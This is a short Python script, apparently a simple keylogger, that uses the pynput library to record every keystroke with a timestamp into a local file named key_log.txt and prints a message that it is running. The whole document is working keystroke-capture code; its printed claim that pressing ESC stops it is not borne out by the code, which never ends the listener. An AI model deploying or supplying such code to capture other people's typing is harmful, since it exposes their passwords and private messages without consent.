
from pynput import keyboard
import logging
from datetime import datetime

# Log file setup
log_filename = "key_log.txt"
logging.basicConfig(filename=log_filename, level=logging.DEBUG, format="%(asctime)s: %(message)s")

def on_press(key):
    try:
        logging.info(f"Key pressed: {key.char}")
    except AttributeError:
        logging.info(f"Special key pressed: {key}")

print("[*] Keylogger is running... (Press ESC to stop)")

with keyboard.Listener(on_press=on_press) as listener:
    listener.join()